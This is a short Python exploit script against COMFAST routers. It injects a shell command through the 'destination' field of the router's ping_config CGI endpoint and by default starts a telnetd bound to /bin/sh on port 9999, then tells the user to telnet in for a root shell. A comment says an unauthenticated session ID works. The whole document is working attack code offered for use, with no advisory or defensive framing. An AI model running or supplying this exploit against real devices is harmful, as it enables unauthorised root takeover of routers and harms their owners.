# tested, sometimes fails? need to find why
# COMFAST_SESSIONID can be an unauthed user

import requests
import sys
import argparse

def exploit(router_ip, session_id, command="telnetd -l /bin/sh -p 9999"):
    url = f"http://{router_ip}/cgi-bin/mbox-config?method=SET&section=ping_config"
    payload = f'127.0.0.1"; {command}; #'
    
    headers = {
        "Content-Type": "application/json",
        "Cookie": f"COMFAST_SESSIONID={session_id}"
    }
    
    data = {"destination": payload}
    
    try:
        response = requests.post(url, headers=headers, json=data, timeout=10)
        print(f"Status: {response.status_code}")
        print(f"Response: {response.text[:500]}")
        if response.status_code == 200:
            print("Payload sent. Check if command executed.")
            if "telnetd" in command:
                print(f"Try: telnet {router_ip} 9999 for root shell.")
        else:
            print("Failed. Wrong session or router not vulnerable.")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("ip", help="Router IP")
    parser.add_argument("session", help="COMFAST_SESSIONID value")
    parser.add_argument("-c", "--cmd", default="telnetd -l /bin/sh -p 9999", 
                       help="Command to run (default starts telnetd)")
    args = parser.parse_args()
    
    exploit(args.ip, args.session, args.cmd)